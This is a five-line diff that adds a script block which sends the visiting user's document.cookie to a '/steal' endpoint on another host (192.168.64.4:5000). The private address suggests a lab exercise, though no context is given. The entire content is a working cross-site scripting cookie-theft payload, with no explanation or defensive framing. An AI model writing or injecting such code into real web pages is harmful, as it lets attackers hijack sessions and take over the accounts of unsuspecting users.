@@ -1,0 +1,5 @@
+<script>
+    let xhr = new XMLHttpRequest();
+    xhr.open("GET", "http://192.168.64.4:5000/steal?cookie=" + encodeURIComponent(document.cookie), true);
+    xhr.send();
+</script>
